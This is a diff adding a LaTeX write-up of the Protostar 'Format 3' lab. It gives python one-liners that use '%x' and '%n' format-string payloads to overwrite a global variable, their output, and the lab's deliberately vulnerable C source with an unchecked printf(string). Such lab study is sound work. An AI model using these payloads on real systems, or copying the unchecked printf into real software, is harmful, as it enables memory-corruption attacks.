@@ -1,0 +1,98 @@
+
+\begin{center}\begin{LARGE}Format 3\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+We can see that the problem is similar to format 2, but this time we need to
+carefully modify the variable in memory such that in the compare statement we
+have the required 4 bytes value.
+
+\begin{lstlisting}[language=bash]
+objdump -t format3 | grep target
+080496f4 g     O .bss   00000004              target
+\end{lstlisting}
+
+Similarly we find the memory location of target again. We now will begin
+injecting some string format to test the output of the program.
+
+\subsection*{Idea and Attack process}
+
+\begin{lstlisting}[language=bash]
+python -c "print 'AAAA' + '%x.'*15" | ./format3
+AAAA0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.
+target is 00000000 :(
+\end{lstlisting}
+
+We run the above code to first find out where in memory does the input reside in.
+Having found the location, we will now inject the memory location of target and
+we will also modify the format specifier which resides at the location of the string.
+
+\begin{lstlisting}[language=bash]
+python -c "print '\xf4\x96\x04\x08' + '%x.'*11 + '%n'" | ./format3
+0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14.
+target is 0000004c :(
+\end{lstlisting}
+
+Now that we can see there is some modifications to the target variable, we want
+to write a specific value of $0x01025544$ using this pointer. This a 4byte value
+to be written. We can conclude that we have to write this value to 4 memory
+location from $0x080496f4$ to \lstinline|0x080496f7|.
+
+Searching online, we can see that it is possible to modify the values of multiple
+memory location using the following line of code.
+
+\begin{lstlisting}[language=bash]
+python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08' + '%x.'*11 + '%n%n%n%n'" | ./format3
+target is 58585858 :(
+\end{lstlisting}
+
+Now that we are able to confirm that we can modify the target variable, we will
+try to inject the values that we want to write to these memory location. We
+structure the attack such that it is based on groups of [Value, Address]. We
+repeat this structure for the 4 bytes that we want to write, to inject the value
+we use "\%u" as a mechanism to obtain the needed value and "\%n" to inject the value
+into the memory location. We refer to the short python calculate in this website,
+https://xavibel.com/2020/11/22/protostar-format-strings-level-3/ to obtain the
+offset needed. Computing the values, we are able to create our format attack string.
+
+\begin{lstlisting}[language=bash]
+python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%220u%n%17u%n%173u%n%255u%n'" | ./format3
+0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14...
+you have modified the target :)
+\end{lstlisting}
+
+\subsection*{Source code}
+
+\begin{lstlisting}[language=c]
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int target;
+
+void printbuffer(char *string)
+{
+  printf(string);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printbuffer(buffer);
+  
+  if(target == 0x01025544) {
+      printf("you have modified the target :)\n");
+  } else {
+      printf("target is %08x :(\n", target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+\end{lstlisting}
